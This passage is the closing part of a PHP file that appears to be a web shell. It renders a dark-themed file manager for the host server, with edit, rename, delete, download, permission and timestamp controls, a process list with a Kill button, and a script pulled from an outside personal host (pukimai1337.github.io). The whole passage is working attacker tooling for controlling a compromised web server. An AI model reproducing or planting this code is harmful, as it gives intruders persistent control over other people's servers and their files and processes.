									<td class="px-2" title="<?= htmlspecialchars($prc['command']) ?>"><small class="text-slate-400"><?= htmlspecialchars(substr($prc['command'], 0, 50)) ?></td>
									<td class="px-2">
										<form method="POST">
											<input type="hidden" name="pid" value="<?= $prc['pid'] ?>">
											<button type="submit" class="btn btn-danger btn-sm"><i class="bi bi-person-exclamation"></i> Kill</button>
										</form>
									</td>
								</tr><?php } ?>
							</tbody>
						</table>
					</div>
				</div>
					<div class="text-center py-1">
						<?= $cpr ?>
					</div>
				<?php
					exit();
				}
			?>
			<div class="overflow-x-auto h-full max-h-[80vh]">
				<table class="table table-hover table-dark align-middle text-dark text-nowrap">
					<thead class="align-middle">
						<tr>
							<td style="width:30%">Name</td>
							<td style="width:15%">Type</td>
							<td style="width:15%">Size</td>
							<td style="width:15%">Owner<b class="text-success">:</b>Group</td>
							<td style="width:15%">Permission</td>
							<td style="width:15%">Last Modified</td>
							<td style="width:10%">Actions</td>
						</tr>
					</thead>
					<tbody class="table-group-divider">
						<?php
							foreach ($darkx as $item) {
								if (is_dir($item)) {
									if(function_exists('posix_getpwuid')) {
										$d_own = @posix_getpwuid(fileowner("$item"));
										$d_own = $d_own['name'];
									} else {
										$d_own = fileowner("$item");
									}
								if(function_exists('posix_getgrgid')) {
									$d_grp = @posix_getgrgid(filegroup("$item"));
									$d_grp = $d_grp['name'];
								} else {
									$d_grp = filegroup("$item");
							}
						?>
						<tr>
							<td>
							<?php
								if ($item === '..') {
									echo '<a href="?x=' . hx(dirname($dark)) . '"><i class="bi bi-folder2-open" style="color:orange;"></i> ' . $item . '</a>';
								} elseif ($item === '.') {
									echo '<a href="?x=' . hx($dark) . '"><i class="bi bi-folder2-open" style="color:orange;"></i> ' . $item . '</a>';
								} else {
									echo '<a href="?x=' . hx($dark . '/' . $item) .'"><i class="bi bi-folder-fill" style="color:orange;"></i> ' . np($item) . '</a>';
								}
							?>
							</td>
							<td><?= strtoupper(filetype($item))?></td>
							<td>-</td>
							<td><?=$d_own;?><b class="text-success">:</b><?=$d_grp;?></td>
							<td>
								<a style="cursor: pointer;" class="p-btn" data-item="<?= $item ?>" data-file-content="<?= substr(sprintf('%o', fileperms($item)), -4); ?>">
									<?php echo '<font color="'.(is_writable($item) ? '#5cb85c' : '#DC4C64').'">'.substr(sprintf('%o', fileperms($item)), -4).'</font> > '; echo is_writable($dark . '/' . $item) ? '<font color="#5cb85c">' : (!is_readable($dark . '/' . $item) ? '<font color="#DC4C64">' : ''); echo pall($dark . '/' . $item); echo '</font>';if(is_writable($dark . '/' . $item) || !is_readable($dark . '/' . $item)) ?>
								</a>		
							</td>
							<td>
								<a style="cursor: pointer;" class="date-btn" data-item="<?= $item ?>" data-file-content="<?= date("Y-m-d h:i:s", filemtime($item)); ?>"><?= date("Y-m-d h:i:s", filemtime($item)); ?></a>
							</td>
							<td>
								<?php
									if ($item != '.' && $item != '..') {
								?>
								<div class="btn-group">
									<button type="button" class="btn btn-outline-light btn-sm mr-1 r-btn" data-item="<?= $item ?>"><i class="bi bi-pencil-square"></i></button>
									<button type="button" class="btn btn-outline-danger btn-sm mr-1 d-btn" data-item="<?= $item ?>"><i class="bi bi-trash"></i></button>
								</div>
								<?php
									} elseif ($item === '.') {
								?>
								<div class="btn-group">
									<button type="button" class="btn btn-outline-light btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#tambahFolder"><i class="bi bi-folder-plus"></i></button>
									<button type="button" class="btn btn-outline-light btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#tambahFile"><i class="bi bi-file-earmark-plus"></i></button>
								</div>
								<?php
									}
								?>
							</td>
						</tr>
						<?php
								}
							}
							foreach ($darkx as $item) {
								if (is_file($item)) {
									if(function_exists('posix_getpwuid')) {
										$f_own = @posix_getpwuid(fileowner("$item"));
										$f_own = $f_own['name'];
									} else {
										$f_own = fileowner("$item");
									}
								if(function_exists('posix_getgrgid')) {
									$f_grp = @posix_getgrgid(filegroup("$item"));
									$f_grp = $f_grp['name'];
								} else {
									$f_grp = filegroup("$item");
							}
							switch ($item) {
									case (basename($_SERVER['SCRIPT_FILENAME'])): $_F = '<b class="text-danger">' . $item . '</b>'; 
								break; 
								default: $_F = np($item);
							}
						?>
						<tr>
							<td>
								<i class="<?= ext($item);?>"></i> <a href="?x=<?= hx($dark) ?>&item=<?= hx($item) ?>&act=ef"><?= $_F;?></b></a>
							</td>
							<td><?= np(function_exists('mime_content_type') ? mime_content_type($item) : filetype($item)) ?></td>
							<td><?= sall($item) ?></b></td>
							<td><?=$f_own;?><b class="text-success">:</b><?=$f_grp;?></td>
							<td>
								<a style="cursor: pointer;" class="p-btn" data-item="<?= $item ?>" data-file-content="<?= substr(sprintf('%o', fileperms($item)), -4); ?>">
								<?php echo '<font color="'.(is_writable($item) ? '#5cb85c' : '#DC4C64').'">'.substr(sprintf('%o', fileperms($item)), -4).'</font> > '; echo is_writable($dark . '/' . $item) ? '<font color="#5cb85c">' : (!is_readable($dark . '/' . $item) ? '<font color="#DC4C64">' : ''); echo pall($dark . '/' . $item); echo '</font>';if(is_writable($dark . '/' . $item) || !is_readable($dark . '/' . $item)) ?>
								</a>
							</td>
							<td>
								<a style="cursor: pointer;" class="date-btn" data-item="<?= $item ?>" data-file-content="<?= date("Y-m-d h:i:s", filemtime($item)); ?>"><?= date("Y-m-d h:i:s", filemtime($item)); ?></a>
							</td>
							<td>
								<?php
									if ($item != '.' && $item != '..') {
								?>
								<div class="btn-group">
									<a href="?x=<?= hx($dark) ?>&item=<?= hx($item) ?>&act=ef" class="btn btn-outline-light btn-sm mr-1"><i class="bi bi-file-earmark-code"></i></a>
									<button type="button" class="btn btn-outline-light btn-sm mr-1 r-btn" data-item="<?= $item ?>"><i class="bi bi-pencil-square"></i></button>
									<a href="?x=<?= hx($dark) ?>&item=<?= hx($item) ?>&act=df" class="btn btn-outline-light btn-sm mr-1"><i class="bi bi-download"></i></a>
									<button type="button" class="btn btn-outline-danger btn-sm mr-1 d-btn" data-item="<?= $item ?>"><i class="bi bi-trash"></i></button>
								</div>
								<?php
									}
								?>
							</td>
						</tr>
						<?php
								}
							}
						?>
					</tbody>
				</table>
			</div>
			<?php
				if (!is_readable($dark)) {
					echo '<div class="text-center py-3">';
					echo "403 Can't access directory.";
					echo '<br>'
					.$cpr;
					echo '</div>';
					exit();
				}
			?>
			<?php
				if (count($darkx) === 2) {
					echo '<center>Directory is empty.</center>';
				}
			?>
			<div class="py-2">
				<?= $cpr ?>
			</div>
		</div>
	</div>
	<script src="//code.jquery.com/jquery-3.7.0.js"></script>
	<script src="//cdn.jsdelivr.net/npm/bootstrap@5.3.5/dist/js/bootstrap.bundle.min.js"></script>
	<script src="//pukimai1337.github.io/puki/dark.js"></script>
	<script type="text/javascript">
	<?php if (isset($_GET['act']) && isset($_GET['item']) && $_GET['act'] === 'ef') : ?>
		$(document).ready(function() { $("#em").modal("show"); });
	<?php endif; ?>
	<?php if (isset($_POST['start'])) : ?>
		$(document).ready(function() { $("#masken").modal("show"); });
	<?php endif; ?>
	<?php if (isset($_SESSION['message'])) : ?>
		get('<?= $_SESSION['message'] ?>', '<?= $_SESSION['color'] ?>')
	<?php endif; clear(); ?>
	</script>
</body>
</html>
